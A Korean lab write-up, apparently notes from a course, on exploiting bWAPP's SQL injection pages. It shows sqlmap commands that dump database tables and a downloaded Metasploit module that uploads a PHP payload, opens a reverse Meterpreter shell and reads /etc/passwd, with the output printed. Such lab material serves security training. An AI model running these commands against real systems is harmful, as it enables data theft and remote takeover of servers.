---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - SQL 인젝션 기초(SQLMAP & Metasploit 활용)"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part1 A1
  - SQL 인젝션
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 8강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

# SQL 인젝션 기초

## SQLMAP & Metasploit 활용

## SQLMAP

* SQL 인젝션 결함을 이용하여 익스플로잇, 데이터베이스 서버를 접수하기 위한 오픈 소스
* 침투 점검을 위한 툴
* MySQL, Oracle, PostgreSQL, Microsoft SQL Server 등을 지원
* [SQLMAP 소개](https://blog.naver.com/isc0304/220372379862)
* [SQLMAP 옵션](https://blog.naver.com/isc0304/220372380274)
* [MySQL 자주 사용하는 구문](https://blog.naver.com/isc0304/220374862945)

### 1. SQL Injection (Get/Search)

![image](https://user-images.githubusercontent.com/28076542/52029464-a492a580-2556-11e9-814f-cefdc2f44b2f.png)

* URL: `http://192.168.190.143/bWAPP/sqli_1.php?title=aaaaa&action=search`

### 2. 칼리리눅스에서 SQLMAP 실행

* BurpSuite로 쿠키 획득

![image](https://user-images.githubusercontent.com/28076542/52032404-17eee400-2564-11e9-8053-31a9fc070871.png)

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_1.php?title=aaaaa&action=search" --banner -v 3 -p title --cookie="security_level=0; PHPSESSID=1b689371cf8562edd56a5c1af28510e5"
```

* --banner: banner를 보여주는 옵션
* -v: 진행을 자세히 보여주는 옵션
* -p: 파라미터 입력
* -cookie: 쿠키 값 입력
* 선택지 나오면 다 N

![image](https://user-images.githubusercontent.com/28076542/52032692-6650b280-2565-11e9-8bcf-7b051bc31ff4.png)

* 데이터베이스 이름 가져오기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_1.php?title=aaaaa&action=search" -v 3 -p title --cookie="security_level=0; PHPSESSID=1b689371cf8562edd56a5c1af28510e5" --dbs
```

![image](https://user-images.githubusercontent.com/28076542/52032769-c47d9580-2565-11e9-8cca-4dfb5e08e931.png)

* testdb의 testable1 테이블을 덤프하기

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_1.php?title=aaaaa&action=search" -v 3 -p title --cookie="security_level=0; PHPSESSID=1b689371cf8562edd56a5c1af28510e5" -D testdb -T testtable1 --dump
```

![image](https://user-images.githubusercontent.com/28076542/52032847-1cb49780-2566-11e9-926f-cef11a16c21e.png)

## SQL Injection (Post/Search)

![image](https://user-images.githubusercontent.com/28076542/52034398-b6327800-256b-11e9-9d91-a838c5ab753a.png)

![image](https://user-images.githubusercontent.com/28076542/52034428-c77b8480-256b-11e9-9915-144566060f09.png)

```bash
sqlmap -u "http://192.168.190.143/bWAPP/sqli_6.php" --data="title=aaaaa&action=search" -v 3 -p title --cookie="security_level=0; PHPSESSID=bf6e1b3cbaa2697436082ec34efd08a4" -D testdb -T testtable1 --dump
```

![image](https://user-images.githubusercontent.com/28076542/52034954-ca2aa980-256c-11e9-854b-419b55e24d24.png)

## sleep 함수 확인하기

* `ctrl+shift+f` 입력 후 sleep 검색

![image](https://user-images.githubusercontent.com/28076542/52035070-14ac2600-256d-11e9-9318-2e105f057ece.png)

* 데이터베이스의 스레드를 잠을 재워 응답을 지연시키는 함수
* sqlmap에서 sleep 함수는 빼는 것이 좋음(방법은 모르겠음...)

## 메타스플로잇

* 보안 프로젝트에서 많이 사용하는 도구

### 1. 구글에서 bwapp-=sql inurl 검색 후 Raw 눌러서 URL 접속

* [github](https://github.com/naiduv/codecrawl/blob/master/code/bwapp-sqli.rb)
* URL: `https://raw.githubusercontent.com/naiduv/codecrawl/master/code/bwapp-sqli.rb`

### 2. 칼리리눅스 터미널을 열고 다음 명령어 입력

```bash
wget https://raw.githubusercontent.com/naiduv/codecrawl/master/code/bwapp-sqli.rb
cp bwapp-sqli.rb /usr/share/metasploit-framework/modules/exploits/multi/http/bwapp-cmdi.rb
msfdb init
msfconsole
msf > search bwapp
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                           Disclosure Date  Rank       Description
   ----                           ---------------  ----       -----------
   exploit/multi/http/bwapp-cmdi                   excellent  bWAPP Sql Injection
msf > use exploit/multi/http/bwapp-cmdi
msf exploit(bwapp-cmdi) > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    irb           Drop into irb scripting mode
    load          Load a framework plugin
    quit          Exit the console
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    edit          Edit the current module or a file with the preferred editor
    info          Displays information about one or more modules
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Selects a module by name


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Exploit Commands
================

    Command       Description
    -------       -----------
    check         Check to see if a target is vulnerable
    exploit       Launch an exploit attempt
    pry           Open a Pry session on the current module
    rcheck        Reloads the module and checks if the target is vulnerable
    recheck       Alias for rcheck
    reload        Just reloads the module
    rerun         Alias for rexploit
    rexploit      Reloads the module and launches an exploit attempt
    run           Alias for exploit
```

* check 명령어를 사용해 취약점을 찾음

```bash
msf exploit(bwapp-cmdi) > check
[-] Check failed: Msf::OptionValidateError The following options failed to validate: RHOST.

msf exploit(bwapp-cmdi) > show options

Module options (exploit/multi/http/bwapp-cmdi):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   bug              no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /bWAPP/          yes       Base bWAPP directory path
   USERNAME   bee              yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

* Required가 yes인게 꼭 필요함

```bash
msf exploit(bwapp-cmdi) > set RHOST 192.168.190.143
RHOST => 192.168.190.143
msf exploit(bwapp-cmdi) > check

[*] Checking bWAPP SQLI
[*] bWAPP sqli_1.php file detected
[+] 192.168.190.143:80 The target is vulnerable.
```

* bWAPP sqli_1.php가 탐지되면 취약하다고 해줌

```bash
msf exploit(bwapp-cmdi) > run

[*] Started reverse TCP handler on 192.168.190.152:4444 
[*] Payload uploaded to images/JVX.php
[*] Sending stage (37543 bytes) to 192.168.190.143
[*] Meterpreter session 1 opened (192.168.190.152:4444 -> 192.168.190.143:57199) at 2019-02-03 11:33:21 +0900
```

* Meterpreter: 백도어와 같은 하나의 쉘로 다른 컴퓨터를 원격으로 조종할 수 있음
* shell 명령어를 사용해 상대 PC 쉘을 사용할 수 있음

```bash
meterpreter > shell
Process 27947 created.
Channel 0 created.
whoami
www-data
pwd
/var/www/bWAPP/images
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
hplip:x:104:7:HPLIP system user,,,:/var/run/hplip:/bin/false
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
gdm:x:106:114:Gnome Display Manager:/var/lib/gdm:/bin/false
pulse:x:107:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
messagebus:x:108:119::/var/run/dbus:/bin/false
avahi:x:109:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
polkituser:x:110:122:PolicyKit,,,:/var/run/PolicyKit:/bin/false
haldaemon:x:111:123:Hardware abstraction layer,,,:/var/run/hald:/bin/false
bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
mysql:x:112:124:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
dovecot:x:114:126:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
smmta:x:115:127:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:116:128:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
neo:x:1001:1001::/home/neo:/bin/sh
alice:x:1002:1002::/home/alice:/bin/sh
thor:x:1003:1003::/home/thor:/bin/sh
wolverine:x:1004:1004::/home/wolverine:/bin/sh
johnny:x:1005:1005::/home/johnny:/bin/sh
selene:x:1006:1006::/home/selene:/bin/sh
postfix:x:117:129::/var/spool/postfix:/bin/false
proftpd:x:118:65534::/var/run/proftpd:/bin/false
ftp:x:119:65534::/home/ftp:/bin/false
snmp:x:120:65534::/var/lib/snmp:/bin/false
ntp:x:121:131::/home/ntp:/bin/false
```